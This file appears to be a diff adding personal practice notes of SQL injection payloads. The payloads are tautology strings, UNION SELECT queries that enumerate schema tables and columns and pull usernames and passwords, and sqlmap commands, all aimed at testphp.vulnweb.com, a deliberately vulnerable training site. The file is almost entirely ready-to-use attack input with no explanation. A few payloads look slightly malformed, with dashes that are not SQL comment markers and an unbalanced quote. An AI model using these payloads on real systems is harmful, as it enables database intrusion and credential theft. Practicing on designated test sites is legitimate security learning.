@@ -1,0 +1,27 @@
+' OR '1'='1'
+SELECT * FROM users WHERE id = 1' OR '1'='1
+1' UNION SELECT null, table_name FROM information_schema.tables#
+1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='SCHEMATA
+
+
+
+
+
+http://testphp.vulnweb.com/artists.php?
+http://testphp.vulnweb.com/artists.php?artist=1
+http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,2,3 –
+
+http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, table_name, 3 FROM
+information_schema.tables WHERE table_schema='target_database' –
+
+http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, username, password
+FROM users –
+
+
+
+
+
+
+sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=test&pass=test"
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" –dbs
